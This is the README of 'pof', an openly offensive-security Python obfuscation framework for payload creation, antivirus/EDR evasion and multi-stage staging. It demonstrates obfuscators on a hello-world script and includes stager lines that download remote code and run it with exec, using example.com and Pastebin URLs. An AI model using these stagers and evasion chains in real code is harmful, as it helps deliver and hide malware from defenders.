# pof

[![python-obfuscation-framework-pypi](https://img.shields.io/pypi/v/python-obfuscation-framework.svg)](https://pypi.org/project/python-obfuscation-framework)

Python Obfuscation Framework.

Combine and chain obfuscation methods on a single Python source file.

Install:

```bash
pip install python-obfuscation-framework
```

Source:

```python
print('Hello, world')
```

Run:

```bash
pof in.py -o out.py
```

Output:

```python
from base64 import b64decode as expected_data
from base64 import b85decode as _5269
globals()["".join([chr(ord(i)-3)for i in'bbvqlwolxebb'[::-1]])].__dict__[_5269('').decode().join([chr(ord(i)-3)for i in"".join([chr(ord(i)-3)for i in'mruhgry'])])]()[_5269(''[::-1]).decode().join([globals()[''[::-1].join([chr(ord(i)-3)for i in expected_data('YmJleGxvd2xxdmJi').decode()])].__dict__["".join([chr(ord(i)-3)for i in"".join([chr(ord(i)-3)for i in'inx'])])](__builtins__.__dict__.__getitem__("".join([chr(ord(i)-3)for i in'']).join([chr(ord(i)-3)for i in expected_data('cnVn').decode()]))(i)-(__name__.__len__().__class__(__builtins__.__dict__.__getitem__(_5269('X>N1').decode())("".join([chr(ord(i)-3)for i in'3\u007b5']),0)+__builtins__.__getattribute__('egapraeytamrofel'[::-1].replace('egapraeytamrof'[::-1],expected_data('bg==').decode()))(expected_data("".join([chr(ord(i)-3)for i in']j@@'])).decode()))))for i in"".join([chr(ord(i)-3)for i in'eeh{olsy7bdgguvtyee']).replace(_5269('X>fKlUtwfqa&r').decode(),_5269('Z+C0').decode())])].__dict__[''[::-1].join([chr(ord(i)-3)for i in''[::-1]]).join([globals()[expected_data('XordinalidWlsdGlucordinalf'.replace('ordinal','19')).decode()].__dict__[expected_data('yh2Y'[::-1]).decode()](globals()[_5269(expected_data('VXRlTiVYPjQ/OVpnWEU+').decode()).decode()].__dict__[_5269('fold_countV'.replace('fold_count','Z*p')).decode()](i)-__builtins__.__getattribute__(expected_data("".join([chr(ord(i)-3)for i in'dZ83'])).decode())('quaencode_7or8bits'.replace('encode_7or8bit','ntile').replace("".join([chr(ord(i)-3)for i in'txdqwlohv']),"".join([chr(ord(i)-3)for i in'6']))))for i in expected_data('').decode().join([chr(ord(i)-3)for i in'ztoxv'[::-1]])])](expected_data(_5269('Q%6>FVKQQ0ad38HZFp+').decode().replace('pq_b2a'[::-1],'\u0062\u00478\u0073\u0049\u0048\u0064')).decode())
```

More examples and usage can be found in `examples/` or in the section bellow.

## Goals

The goals of this project are to create a toolkit to obfuscate Python source code, mainly to create payload for offensive security.

pof will allow you to:

- create **payloads**: store the code inside images, have multiple stages, use LOTL techniques
- create **stager**: easily create multi stages payloads
- do **evasion**: AV, EDR, DPI, sandbox and other analysis techniques
- slow **analysis**: slow down human analysis of the payload
- enable **automation**: automate the whole process, to produce numerous variant of the payload
- be **cross-platform**: works on Linux, Windows, and macOS
- have **fun**: because it's always fun to see what's possible to do with Python

This project also tries to combine all other Python obfuscation tools available, because most of them only provide a single method, and it's pretty basic. So you should be able to do everything that those other tools do, but without having to use multiple.

Python is not exactly the best language to create payloads with, especially for Windows if the interpreter is not already installed. This project was made for learning, and discovering new ways of bypassing security, it's a great way to test obfuscations techniques.

This project could also give you ideas to implement in other languages, such as powershell where it would make sens to obfuscate the source code. Or in C, C#, C++, Go or Rust where it would make sens to stage payloads, compress them, encrypt them and obfuscate strings.

You could also use most of the stagers to stage payload that are not built in Python.

## Install

There are 4 installation options, with PIP, a virtualenv, a Docker container, or with Nix.

### 1. PIP

From [pypi](https://pypi.org/project/python-obfuscation-framework):

```bash
pip install python-obfuscation-framework
```

### 2. Source

```bash
git clone https://github.com/deoktr/pof
cd pof
python -m venv venv
source ./venv/bin/activate
pip install .
```

This will install pof inside a virtual env, so you'll need to activate it every time you want to use it.

### 3. Docker

```bash
git clone https://github.com/deoktr/pof
cd pof
docker build -t pof .
docker run --rm pof --help
```

Run inside Docker from a local file `in.py`:

```bash
docker run --rm -v $(pwd):/tmp pof /tmp/in.py -o /tmp/out.py
```

### 4. Nix

From [github.com/onix-sec/nixsecpkgs](https://github.com/onix-sec/nixsecpkgs):

```bash
nix shell github:onix-sec/nixsecpkgs#pof
```

## Usage

```bash
# pipe input and output to stdout
echo "print('Hello, world')" | pof

# output to file
pof in.py -o out.py

# redirect to file
pof in.py > out.py

# pipe to python to run it
pof in.py | python

# obfuscator
pof in.py -o out.py -f obfuscator -k BuiltinsObfuscator

# stager
pof in.py -o out.py -f stager -k PasteRsStager

# evasion
pof in.py -o out.py -f evasion -k CPUCountEvasion

# evasion with custom params
pof in.py -o out.py -f evasion -k CPUCountEvasion min_cpu_count=4

# combine everything from the CLI
pof in.py -f obfuscator -k BuiltinsObfuscator |\
    pof -f evasion -k CPUCountEvasion min_cpu_count=4 |\
    pof -f stager -k PasteRsStager > out.py
```

You can also use the Python API directly, you can find examples in the corresponding directory or bellow.

## Examples

These are examples of obfuscators of the script `print('Hello, world')`.

To select an obfuscator use the flag `-f obfuscator` and `-k ObfuscatorClassName`.

To reproduce the examples you can use the following command:

```bash
echo "print('Hello, world')" | pof -f obfuscator -k UUIDObfuscator
```

To test the validity of the output you can simply pipe it to Python:

```bash
echo "print('Hello, world')" | pof -f obfuscator -k UUIDObfuscator | python
```

### Obfuscator

#### StringsObfuscator

```python
# Reverse
print('dlrow ,olleH'[::-1])

# Replace
print('Helnelemd'.replace('nelem','lo, worl'))

# One on n
print("".join([d if g%3==0 else""for g,d in enumerate('H9IesYlvJl5loU4,dK nDw51ovsrozl0UdoI!jL')]))

# Unicode
print('\u0048\u0065\u006c\u006c\u006f\u002c\u0020\u0077\u006f\u0072\u006c\u0064')

# Shift cipher
print("".join([chr(ord(i)-3)for i in'Khoor/#zruog']))

# Base 64 encoding
from base64 import b64decode
print(b64decode( b'SGVsbG8sIHdvcmxk').decode())

# Base 85
from base64 import b85decode
print(b85decode( b'NM&qnZ!92pZ*pv8').decode())
```

#### NumberObfuscator

Source: `print(42)`

```python
# String
print(int('42'))

# Addition
print((int(35+7)))

# Hex
print(int('0x2a',0))

# Len
print(len('bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'))

# Boolean
print((True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True+True))
```

#### DefinitionsObfuscator

Source:

```python
def say_hello(t):
    print(t)
say_hello("Hello, world")
```

Obfuscated:

```python
def sczCWV(t):
  print(t)
sczCWV('Hello, world')
```

#### BuiltinsObfuscator

Obfuscate builtins functions using one of the following methods.

```python
__builtins__.__getattribute__('print')('Hello, world')

__builtins__.__dict__['print']('Hello, world')

globals()['__builtins__'].__dict__['print']('Hello, world')

__builtins__.__dict__.__getitem__('print')('Hello, world')
```

#### ConstantsObfuscator

Move every variable at the top of the file.

```python
vVlJ='Hello, world'
t4Bo=print
t4Bo(vVlJ)
```

#### ExtractVariablesObfuscator

Extract variables in the same context level, meaning if inside a function will add the variable at the beginning of it.

```python
var='Hello, world'
print(var)
```

> [!WARNING]
> Right now this function is broken and can fail.

#### CallObfuscator

```python
print.__call__('Hello, world')
```

#### ShiftObfuscator

```python
exec("".join([chr(ord(i)-3)for i in'sulqw+*Khoor/#zruog*,\r']))
```

#### DocstringObfuscator

```python
from base64 import b64decode
class Foo:
    """
    cHJpbnQoJ0hlbGxvLCB3b3JsZCcpCg==
    """
    pass


exec(b64decode(Foo.__doc__.replace('\n','').replace(' ','')))
```

#### SpacenTabObfuscator

```python
def sntdecode(encoded):
    msg_bin=encoded.replace(" ","0").replace("\t","1")
    n=int(msg_bin,2)
    return n.to_bytes((n.bit_length()+7)//8,"big")

exec(sntdecode('\t\t\t     \t\t\t  \t  \t\t \t  \t \t\t \t\t\t  \t\t\t \t    \t \t     \t  \t\t\t \t  \t    \t\t  \t \t \t\t \t\t   \t\t \t\t   \t\t \t\t\t\t  \t \t\t    \t      \t\t\t \t\t\t \t\t \t\t\t\t \t\t\t  \t  \t\t \t\t   \t\t  \t    \t  \t\t\t  \t \t  \t    \t \t '))
```

#### RC4Obfuscator

Warning: the RC4 obfuscator (and other cipher obfuscators) will combine both, the cipher text and the key in the same file, this is obviously not secure, and should never be used for security purposes. The idea behind this obfuscator is to fool humans, AV, EDR, network TAP etc. not to be secured and safe.

```python
import codecs
def rc4decrypt(key,ciphertext):
    def KSA(key):
        key_length=len(key)
        S=list(range(256))
        j=0
        for i in range(256):
            j=(j+S[i]+key[i%key_length])%256
            S[i],S[j]=S[j],S[i]
        return S
    def PRGA(S):
        i=0
        j=0
        while True:
            i=(i+1)%256
            j=(j+S[i])%256
            S[i],S[j]=S[j],S[i]
            K=S[(S[i]+S[j])%256]
            yield K
    def get_keystream(key):
        S=KSA(key)
        return PRGA(S)
    def encrypt_logic(key,text):
        key=[ord(c)for c in key]
        keystream=get_keystream(key)
        res=[]
        for c in text:
            val="%02X"%(c^next(keystream))
            res.append(val)
        return"".join(res)
    ciphertext=codecs.decode(ciphertext,"hex_codec")
    res=encrypt_logic(key,ciphertext)
    return codecs.decode(res,"hex_codec").decode("utf-8")

exec(rc4decrypt('7zSRE6YHmdwpx2zT1Q2xPoPwzztXRZNQSKeX2LFIKBhl7uJMAs9jj0Hlec6y3wjuNgqgdD1XjnqZSzkWhRldoWwn625Bw56r105zQg5KRE5ugmVOUy2adMWKH2hod0CfxW72XLGFDTt38OH5nDYcr2bXrokKDKCaie56agxxHmSwv4nwTNQlxjyrixBgeyjaDV8CLvdmS4ANRXXVs5HxhxlFiBBUoHadf1wLq0wDi5c0e93fmqqNCRHAMAoTkGJJPCfXc9kTHmW38NJcjnVgvAgrBIcJX66E8pLwUniQB0yvoHapq2RCxaV8PrhU0jFy9RWTrwDfoE3G7whrE8uobVUgFLiJsiH6eV63RvH03gUEi1EHo0YGrRo12yShLG0P8pfSawTjTkJlQOFQ2PsubnQm8fhZ6en7nHI2L2xpC88yNScapMnsRaYUHZFWdecVfOaq9QaMf76RzYpQ7F5LWKgcEG3WGiXReCU1hr5pAoomAcXMZftcYuJu5AuOsXSR','647F6846CBEF6C270D853D3F76650D51DE1CAD760C17'))
```

#### XORObfuscator

```python
from base64 import b64decode

def decrypt(cipher,key):
    bcipher=bytearray(b64decode(cipher))
    text=bytearray()
    ki=0
    for i in bcipher:
        text.append(i^key[ki%len(key)])
        ki+=1
    return text
exec(decrypt( b'RkNfWkAcHnxTXVpbGBROW0RdUhMdPg==', b'61644494').decode())
```

> [!WARNING]
> Like for the RC4 cipher the XOR obfuscator shouldn't be used for security purposes, its main goal is to evade common security tools, not protect the information! Plus the XOR cipher is really weak and easy to crack.

#### Compression

```python
# Bz2Obfuscator
import bz2,marshal
exec(marshal.loads(bz2.decompress( b'BZh91AY&SY\xcf\xf8\xcd\xdc\x00\x00\ru\x80\xc0\x10\x01\x00@\xe4\x00@\x06%\xd4\x80\x08\x00 \x00"&\x80d\x196\xa1L&\x9a\x03LI\x99\\eR\x15\xcd\xb9\x04\xd4s\x1d\x08\x00\xf8\xbb\x92)\xc2\x84\x86\x7f\xc6n\xe0')))

# GzipObfuscator
import gzip,marshal
exec(marshal.loads(gzip.decompress( b'\x1f\x8b\x08\x00$p\x91d\x02\xff\xfb,\xc6\xc0\xc0PP\x94\x99W\xa2\xa1\xee\x91\x9a\x93\x93\xaf\xa3P\x9e_\x94\x93\xa2\xae\xc9\x05\x00\xf2\x90\x8eA\x1b\x00\x00\x00')))

# LzmaObfuscator
import lzma,marshal
exec(marshal.loads(lzma.decompress( b"\xfd7zXZ\x00\x00\x04\xe6\xd6\xb4F\x02\x00!\x01\x16\x00\x00\x00t/\xe5\xa3\x01\x00\x1a\xf3\x16\x00\x00\x00print('Hello, world')\n\x00\x00\xd5\xa4\x00\xec\xfa;\x9c\xf1\x00\x013\x1b\xf7\x19\x88^\x1f\xb6\xf3}\x01\x00\x00\x00\x00\x04YZ")))

# ZlibObfuscator
import zlib,marshal
exec(marshal.loads(zlib.decompress( b'x\x9c\xfb,\xc6\xc0\xc0PP\x94\x99W\xa2\xa1\xee\x91\x9a\x93\x93\xaf\xa3P\x9e_\x94\x93\xa2\xae\xc9\x05\x00va\x08H')))
```

#### Encoding

```python
# ASCII85Obfuscator
from base64 import a85decode
exec(a85decode('E,oZ1F=8M-ASc1$/0K.TEbo86.1-'))

# Base16Obfuscator
from base64 import b16decode
exec(b16decode('7072696E74282748656C6C6F2C20776F726C6427290A'))

# Base32Obfuscator
from base64 import b32decode
exec(b32decode('OBZGS3TUFATUQZLMNRXSYIDXN5ZGYZBHFEFA===='))

# Base32HexObfuscator
from base64 import b32hexdecode
exec(b32hexdecode('E1P6IRJK50JKGPBCDHNIO83NDTP6OP175450===='))

# Base64Obfuscator
from base64 import b64decode
exec(b64decode('cHJpbnQoJ0hlbGxvLCB3b3JsZCcpCg=='))

# Base85Obfuscator
from base64 import b85decode
exec(b85decode('aB^vGbSNiCWo&G3EFgDpa%^NLDGC'))

# BinasciiObfuscator
import binascii,marshal
exec(marshal.loads(binascii.a2b_base64( b'8xYAAABwcmludCgnSGVsbG8sIHdvcmxkJykK\n')))
```

#### Special Encoding

```python
# TokensObfuscator
from tokenize import untokenize
exec(untokenize([(1,'print'),(54,'('),(3,"'Hello, world'"),(54,')'),(4,'\n'),(0,''),]))

# IPv6Obfuscator
import binascii
exec(binascii.a2b_hex(''.join(['7072:696e:7428:2748:656c:6c6f:2c20:776f','726c:6427:290a:1000:0000:0000:0000:0000',]).replace(':','').strip('0')[:-1]))

# MACObfuscator
import binascii
exec(binascii.a2b_hex(''.join(['70-72-69-6e-74-28','27-48-65-6c-6c-6f','2c-20-77-6f-72-6c','64-27-29-0a-10-00',]).replace('-','').strip('0')[:-1]))

# UUIDObfuscator
exec(binascii.a2b_hex("".join(['7072696e-7428-2748-656c-6c6f2c20776f','726c6427-290a-1000-0000-000000000000',]).replace("-","").strip('0')[:-1]))
```

#### ImportsObfuscator

Source: `import pathlib`

```python
pathlib=__import__('pathlib')
```

#### CharFromDocObfuscator

Source: `print('h')`

```python
print(oct.__doc__[8])
```

### Stager

#### DownloadStager

```python
from urllib import request
exec(request.urlopen("https://example.com/payload.py").read())
```

#### ImageStager

The modified picture is not included in this example.

```python
import sys
from PIL import Image
def decode(im_in):
    msg_bin=""
    im=Image.open(im_in)
    px=im.load()
    for x in range(im.size[0]):
        for y in range(im.size[1]):
            pixels=px[x,y]
            msg_bin+=bin(pixels[0])[-1]
    n=8
    mmsg_bin="0"+msg_bin
    chunks=[mmsg_bin[i:i+n]for i in range(0,len(mmsg_bin),n)]
    i=chunks.index("0"*8)
    msg_bin=msg_bin[:(8*i)-1]
    n=int(msg_bin,2)
    msg=n.to_bytes((n.bit_length()+7)//8,"big").decode()
    return msg
exec(decode(sys.argv.pop(1)))
```

#### PastebinStager

```python
from urllib import request
exec(request.urlopen("https://pastebin.com/raw/...").read())
```

> [!NOTE]
> You'll need to add a pastebin API key:
>
> ```bash
> echo "print('Hello, world')" | pof -f stager -k PastebinStager api_dev_key=foo
> ```

The `PasteRsStager` and `Cl1pNetStager` are exactly the same, but the code is not uploaded to the same site. But `PasteRsStager` doesn't require an API key.

#### RC4Stager

The RC4 stager needs to be called with the key has its first argument.

```python
import sys
import codecs
def rc4decrypt(key,ciphertext):
    def KSA(key):
        key_length=len(key)
        S=list(range(256))
        j=0
        for i in range(256):
            j=(j+S[i]+key[i%key_length])%256
            S[i],S[j]=S[j],S[i]
        return S
    def PRGA(S):
        i=0
        j=0
        while True:
            i=(i+1)%256
            j=(j+S[i])%256
            S[i],S[j]=S[j],S[i]
            K=S[(S[i]+S[j])%256]
            yield K
    def get_keystream(key):
        S=KSA(key)
        return PRGA(S)
    def encrypt_logic(key,text):
        key=[ord(c)for c in key]
        keystream=get_keystream(key)
        res=[]
        for c in text:
            val="%02X"%(c^next(keystream))
            res.append(val)
        return"".join(res)
    ciphertext=codecs.decode(ciphertext,"hex_codec")
    res=encrypt_logic(key,ciphertext)
    return codecs.decode(res,"hex_codec").decode("utf-8")

exec(rc4decrypt(sys.argv.pop(1),'A0E9F66914B121B6CD9A7E4532EF281DBB0B8D7FF597A4D5FA2C5EBB47BA2801B33B21819B1F62D5A5D2BDC1E4A4ACD159FB581F860F44D0E4F493C8F55858C83D19EF5DD1BBEB0D143E5C5C9FFF621B187985B6F9FC03E83F80BA3DCD55217949FA04B2F58EC862CC701A0734D1ADB231E5DA54C11E505F520D1B53E50E1F36AA20A163D2BFA43C3E5DDA259A12683C3379D4115C0483C088236FB5DA667EE79D288D99F73A07FCF3F445F933B637B26DD32CC0A0EBE646E7644D2324937910ECB4752E8CEDC09729AF476579944DC13E3629C42634C9483D89617F8941F68506470D53BCC6A94B592101260B96B1BFD83A6C2248E725FF31E4592D21038D677A239E1BA4F9031F7F728DE835BF0C8B28920868A6B880E37C2BBF5E37291210F15F389BF42522D6A9668BA334474D9048AE66997C0AED01178B2EA75DB4D592CBB898773D982A91242AB434F54F00E6B747940D8D0228CB885E8A4977494350FFFA2D2428D0525F8A5A6A22899B0195AD278E804B7BCC47B499DD32329C56B4DB7A6FA81DC935DA9978961604951F0F63757FA754291B32D8E03BE815A38A5EDACB04516AEEAD0F9BA2FB4D8C3E8F5050D810B3B94B1A445973E775114112D279673715858CBA8C4C745C8B9D78CFF81B5C151EACB2E739612C7776BC081B5CA54AF6860E6F04A80F5645B011F4A4'))
```

For this example, the randomly generated key is:

```
TzyaoOa2e4wimAo1AGgeWO5ztZtLzqWo5Wl9OXLWP0r5QmjFO8VvIao6NfqHxMBZCXekiqGDcmFugz10F2wS8UlOtUJB2muLsSxVWoJhq1fKWaZHbiYPd7SSdPhqHMRV1fQkJax5sLssaB43AlHFrx4rJYMvkCjPebHUdjW2l0c8af5cNs60v4dRE3zw2myNZTcrbsbpvogSGYOz21rAXlEZn2y0lbDIpWwI1ZHf8i5vAGxnPPPH9i7OQIMZEunerDbY7cyzHRcZGU1nsVyEmlILGf37NYTxLagRkC6GJP5NCmqboyP5It6bF6AuihUkjLTXTMvrgxfNlMs4g3BkHqZIGjNxFHj6zSB3jhOtOQ9l3zOG36dsMKSye78Xxmn7JjoW5nH76E05QJMBALapu0LaVppSSpSUrpYR2bmwGdbuJNZd7qLL6Yy6vNptSIKcG6Vi6DiFLk7afCw9h9fLdyUC1Ng1sGwt0Jhdf0XnuBedFx6diWYzCrYgWZeM1VnC
```

So we could call it like this:

```bash
python3 out.py TzyaoO...
```

#### QuineStager

```python
from base64 import b64decode
from tokenize import untokenize
esource='cHJpbnQoJ0hlbGxvLCB3b3JsZCcpCg=='
tokens=[(1,'from'),(1,'base64'),(1,'import'),(1,'b64decode'),(4,'\n'),(1,'from'),(1,'tokenize'),(1,'import'),(1,'untokenize'),(4,'\n'),(1,'esource'),(54,'='),(4,'\n'),(1,'tokens'),(54,'='),(4,'\n'),(1,'def'),(1,'quine'),(54,'('),(54,')'),(54,':'),(4,'\n'),(5,' '),(1,'return'),(1,'untokenize'),(54,'('),(1,'tokens'),(54,'['),(54,':'),(2,'12'),(54,']'),(54,')'),(54,'+'),(1,'repr'),(54,'('),(1,'esource'),(54,')'),(54,'+'),(1,'untokenize'),(54,'('),(1,'tokens'),(54,'['),(2,'12'),(54,':'),(2,'15'),(54,']'),(54,')'),(54,'+'),(1,'repr'),(54,'('),(1,'tokens'),(54,')'),(54,'+'),(1,'untokenize'),(54,'('),(1,'tokens'),(54,'['),(2,'15'),(54,':'),(54,']'),(54,')'),(4,'\n'),(6,''),(1,'exec'),(54,'('),(1,'b64decode'),(7,'('),(1,'esource'),(8,')'),(54,')'),(4,'\n')]
def quine():
 return untokenize(tokens[:12])+repr(esource)+untokenize(tokens[12:15])+repr(tokens)+untokenize(tokens[15:])
exec(b64decode(esource))
```

This is most likely useless, a quine is a program that output its source code, and you can generate a quine from your source code with this.

Your script will still execute but a new function `quine` will be available, if you call it you'll have access to the source.

Example usage:

```bash
echo "print(quine())" | pof -f stager -k QuineStager > out.py
python3 out.py > out2.py
python3 out2.py > out3.py
diff out2.py out3.py
```

The `out2.py` and `out3.py` files are identical, they both contain the source code, and the script `print(quine())`.

> [!NOTE]
> By default pof uses a custom `Untokenizer` that removes useless spaces (`NoSpaceUntokenizer` defined in `./pof/utils/tokens.py`), so first generation (in the example `out.py`) will not have spaces present in the subsquent outputs.

### Generators

Generators are used to generate new names, they can be used to classes, variables, functions, constants or any other.

`BasicGenerator.alphabet_generator`:

```
kMX94Fcb
mff0ERu3V
lNRxu3hk
b5PK35uR_t
```

`AdvancedGenerator.realistic_generator`:

Useful to create variables that look realistic.

```
raise_src
expected_message
ContextInputValidation
is_auth
```

`AdvancedGenerator.fixed_length_generator`:

Inspired by: [pyob.oxyry.com](https://pyob.oxyry.com/).

```
O00OOOO00O0O00OOO
O000OOOOO0O000O0O
O0OOOO0000OO0OO00
O000000OO0O0O0OO0
```

`UnicodeGenerator.katakana_generator`:

```
シ
ビラ
ポワ
ヌバ
```

Yes they are valid Python variable name.

Usage:

```python

from pof.utils.generator import UnicodeGenerator

gen = UnicodeGenerator().katakana_generator()
for _ in range(4):
    print(next(gen))
```

### Homoglyphs

[Homoglyphs](https://en.wikipedia.org/wiki/Homoglyph) are glyphs that have the same shape and appear identical. There is a generator to help create them.

Example of homoglyphs for `Hello, world!`:

```
H𝐞llo, world!
Hello, ᴡorld!
Hello, worldǃ
Hello, world！
Hеllo, world!
Hello, woгld!
Hello, woꭈld!
Hello, world!
Hello, worldǃ
Hello¸ world!
Hello, world!
```

Usage:

```python
from pof.utils.se import HomoglyphsGenerator

def get_homoglyphs():
    generator = HomoglyphsGenerator()
    text = "Hello, world!"
    for _ in range(10):
        homoglyph = generator.get_single_homoglyph(text)
        print(homoglyph)
```

## Python API

The true power of pof is in chaining multiple different obfuscation techniques easily, there is a pretty simple Python API to do so.

For example this is a snippet of the default obfuscator:

```python
import random

from pof import BaseObfuscator
from pof.obfuscator import (
    BuiltinsObfuscator,
    CommentsObfuscator,
    ConstantsObfuscator,
    ExceptionObfuscator,
    GlobalsObfuscator,
    LoggingObfuscator,
    # NamesObfuscator,
    NumberObfuscator,
    PrintObfuscator,
    StringsObfuscator,
)
from pof.utils.extract_names import NameExtract
from pof.utils.generator import AdvancedGenerator, BaseGenerator, BasicGenerator


class ExampleObfuscator(BaseObfuscator):
    def obfuscate(self, source: str):
        # tokenize Python source code
        tokens = self._get_tokens(source)

        # get all the names and add them to the RESERVED_WORDS for the generators
        reserved_words_add = NameExtract.get_names(tokens)
        BaseGenerator.extend_reserved(reserved_words_add)

        # remove comments
        tokens = CommentsObfuscator().obfuscate_tokens(tokens)

        # replace logging message with reversable random code
        tokens = LoggingObfuscator().obfuscate_tokens(tokens)

        # remove print statements
        tokens = PrintObfuscator().obfuscate_tokens(tokens)

        # replace exceptions with reversable random names
        tokens = ExceptionObfuscator(
            add_codes=True,
            generator=BasicGenerator.number_name_generator(),
        ).obfuscate_tokens(tokens)

        # configure global generator
        generator = AdvancedGenerator.multi_generator({
            86: AdvancedGenerator.realistic_generator(),
            10: BasicGenerator.alphabet_generator(),
            4: BasicGenerator.number_name_generator(length=random.randint(2, 5)),
        })

        # extract values and function to make them constant
        tokens = ConstantsObfuscator(
            generator=generator,
            obf_number_rate=0.7,
            obf_string_rate=0.1,
            obf_builtins_rate=0.3,
        ).obfuscate_tokens(tokens)

        # FIXME: broken for the moment
        # tokens = NamesObfuscator(generator=generator).obfuscate_tokens(tokens)

        # obfuscate function calls by calling `globals()` instead
        tokens = GlobalsObfuscator().obfuscate_tokens(tokens)

        # obfuscate builtins in many different ways
        tokens = BuiltinsObfuscator().obfuscate_tokens(tokens)

        b64decode_name = next(generator)
        b85decode_name = next(generator)
        string_obfuscator = StringsObfuscator(
            import_b64decode=True,
            import_b85decode=True,
            b64decode_name=b64decode_name,
            b85decode_name=b85decode_name,
        )

        # obfuscate strings in many different ways
        tokens = string_obfuscator.obfuscate_tokens(tokens)

        # for futur usage of `string_obfuscator` don't re-import base64 and 85
        string_obfuscator.import_b64decode = False
        string_obfuscator.import_b85decode = False

        # obfuscate numbers twice in a row in many different ways
        for _ in range(2):
            tokens = NumberObfuscator().obfuscate_tokens(tokens)

        # obfuscate builtins once again
        tokens = BuiltinsObfuscator().obfuscate_tokens(tokens)

        # obfuscate strings two more times
        for _ in range(2):
            tokens = string_obfuscator.obfuscate_tokens(tokens)

        # and produce Python source code from tokens
        return self._untokenize(tokens)


print(ExampleObfuscator().obfuscate(open("source.py", "r").read()))
```

In this example we can see that first we remove comments, logging, print statements, and change the content of exceptions, and then we start to obfuscate constants, names, globals, builtins, strings, then strings and numbers multiple times, and we finally convert the tokens back to code.

By chaining multiple obfuscations techniques we can create very complex and custom output.

Pof also provide evasions methods, detailed below, they are useful for quick and easy evasions, and can be used and customized to fit the need.

For more example of how to use the pof Python API check the [examples/](./examples) directory.

## Yara

Yara rules can be used to detect malware, they can also be used to find interesting strings in Python source code. To check rules against source files and/or obfuscated files run:

```bash
yara --no-warnings yara/python.yar file.py
```

## Development

Project:

- `pof`: contains all the pof source code
  - `pof/obfuscator`: contains obfuscators
  - `pof/stager`: contains satgers
  - `pof/evasion`: contains evasions
  - `pof/utils`: all shared code between stager, obfuscator and evasion
- `wip`: work in progress code that will eventually make its way inside the main code base
- `tests`: unit tests for pof
- `scripts`: some useful scripts to develop or use pof
- `yara`: some yara rules to detect pof obfuscated code

Setup:

```bash
python3 -m venv venv

# activate it (or equivalent for your shell)
source ./venv/bin/activate

# install dep
pip install -e .
pip install -e .[dev]
pip install -e .[test]
```

Run pof:

```bash
./pof.py --help
```

Run tests:

```bash
pytest
```

Format:

```bash
black .
ruff format .
```

Lint:

```bash
ruff check .
```

Test build package:

```bash
pip install -e .[build]

check-manifest --ignore "tests/**"
python3 -m build
python3 -m twine check dist/*
```

## Python 2

No effort is made to support Python 2, most obfuscator, stagers, and evasion should work out of the box, but they are not tested.

## TODO

- Fix `NamesObfuscator`
- Add option to prepend a shebang, and add ability to customize it
- Fix multi line strings

## License

pof is licensed under [GPLv3](./LICENSE).
